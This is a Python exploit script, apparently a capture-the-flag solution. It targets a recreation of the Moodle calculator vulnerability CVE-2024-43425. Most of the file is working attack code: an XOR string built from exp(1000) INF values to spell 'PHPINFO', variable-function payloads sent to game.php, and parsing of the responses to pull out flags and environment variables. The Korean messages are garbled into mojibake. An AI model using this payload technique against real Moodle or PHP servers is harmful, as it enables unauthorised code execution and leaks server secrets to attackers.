#!/usr/bin/env python3
"""
Advanced Calculator - XOR String Generation Exploit
Based on Moodle CVE-2024-43425 vulnerability

This exploit demonstrates how to use XOR operations with INF values
to generate arbitrary strings for variable function calls.
"""

import requests
import sys
import re
from urllib.parse import quote

def banner():
    print("ğŸ”¥ " + "="*60)
    print("    Advanced Calculator - XOR Exploit")
    print("    CVE-2024-43425 ê¸°ë°˜ Variable Functions ê³µê²©")
    print("="*64)
    print()

def generate_xor_payload():
    """
    Generate XOR payload to create 'PHPINFO' string using INF values
    Based on original research: https://blog.redteam-pentesting.de/2024/moodle-rce/
    """
    # exp(1000) generates INF string
    # Use XOR operations to combine INF with numbers to create target string
    
    # Original payload from the research paper
    payload = "((exp(1000) . 0+exp(1000) . 0+exp(1000)) ^ (4 . 2 . 3 . 0 . 0 . 0 . 0) ^ (0 . 0 . 0 . 0 . 0 . 0 . 0) ^ (0 . 0 . -1 . 1 . 1 . 4) ^ (-4 . 8 . 1 . 1 . 1 . 2))"
    
    return payload

def exploit_xor_method(url):
    """
    Exploit using XOR string generation method
    """
    print("ğŸ§® XOR ë¬¸ìì—´ ìƒì„± ë°©ë²•ìœ¼ë¡œ ê³µê²© ì‹œë„")
    
    # Generate the XOR payload for PHPINFO
    xor_string = generate_xor_payload()
    
    # Create variable function call
    payloads = [
        f"{xor_string}{{INFO_ALL}}",
        f"{xor_string}{{1}}",
        f"({xor_string}){{1}}",
    ]
    
    for payload in payloads:
        print(f"   ì‹œë„ ì¤‘: {payload[:50]}...")
        try:
            response = requests.get(f"{url}/game.php", 
                                  params={"f": payload}, 
                                  timeout=10)
            
            if response.status_code == 200:
                if "PHP Version" in response.text or "phpinfo()" in response.text:
                    print("âœ… XOR ê³µê²© ì„±ê³µ!")
                    return response.text, payload
                elif "DH{" in response.text:
                    print("ğŸ‰ í”Œë˜ê·¸ ë°œê²¬!")
                    flag_match = re.search(r'DH\{[^}]+\}', response.text)
                    if flag_match:
                        print(f"ğŸš© í”Œë˜ê·¸: {flag_match.group()}")
                        return response.text, payload
                else:
                    print("   ê²°ê³¼ í™•ì¸ ì¤‘...")
                    # Check if we got some output that might contain flag
                    if len(response.text) > 1000:  # Long response might be phpinfo
                        return response.text, payload
                        
        except Exception as e:
            print(f"   ì˜¤ë¥˜: {str(e)}")
    
    return None, None

def search_flag(response_text):
    """
    Search for flag in response
    """
    flag_patterns = [
        r'DH\{[^}]+\}',
        r'FLAG[^<\s]*DH\{[^}]+\}',
        r'YBG\{[^}]+\}',
    ]
    
    for pattern in flag_patterns:
        matches = re.findall(pattern, response_text)
        if matches:
            return matches
    
    return []

def main():
    banner()
    
    # URL ì„¤ì •
    if len(sys.argv) >= 3:
        url = f"http://{sys.argv[1]}:{sys.argv[2]}"
        print(f"ğŸŒ ì›ê²© ì„œë²„ ëª¨ë“œ: {url}")
    else:
        url = "http://localhost:10001"
        print(f"ğŸ  ë¡œì»¬ ì„œë²„ ëª¨ë“œ: {url}")
    
    print()
    
    print("=" * 50)
    print("XOR ë¬¸ìì—´ ìƒì„±ì„ ì´ìš©í•œ Variable Functions ê³µê²©")
    print("=" * 50)
    
    response_text, successful_payload = exploit_xor_method(url)
    
    if response_text:
        print(f"âœ… ì„±ê³µí•œ í˜ì´ë¡œë“œ: {successful_payload[:100]}...")
        flags = search_flag(response_text)
        
        if flags:
            print("\nğŸ‰ í”Œë˜ê·¸ ë°œê²¬!")
            for flag in flags:
                print(f"ğŸš© {flag}")
        else:
            print("\nğŸ” ì‘ë‹µ ë¶„ì„ ì¤‘...")
            # Look for environment variables section
            if "Environment" in response_text or "FLAG" in response_text:
                print("í™˜ê²½ë³€ìˆ˜ ê´€ë ¨ ë‚´ìš© ë°œê²¬!")
                # Extract relevant parts
                lines = response_text.split('\n')
                for i, line in enumerate(lines):
                    if 'FLAG' in line or 'DH{' in line:
                        print(f"ë¼ì¸ {i}: {line.strip()}")
            else:
                print("phpinfo ì¶œë ¥ì„ í™•ì¸í•˜ì„¸ìš”.")
    else:
        print("\nâŒ ê³µê²©ì´ ì‹¤íŒ¨í–ˆìŠµë‹ˆë‹¤.")
        print("ğŸ’¡ ë””ë²„ê¹… íŒíŠ¸:")
        print("   1. ì„œë²„ê°€ ì •ìƒì ìœ¼ë¡œ ì‹¤í–‰ ì¤‘ì¸ì§€ í™•ì¸")
        print("   2. Moodle ì½”ë“œê°€ ì •í™•íˆ êµ¬í˜„ë˜ì—ˆëŠ”ì§€ í™•ì¸")
        print("   3. XOR í˜ì´ë¡œë“œê°€ ì˜¬ë°”ë¥¸ì§€ í™•ì¸")
        print("   4. Variable Functionsê°€ í™œì„±í™”ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸")

if __name__ == "__main__":
    main()
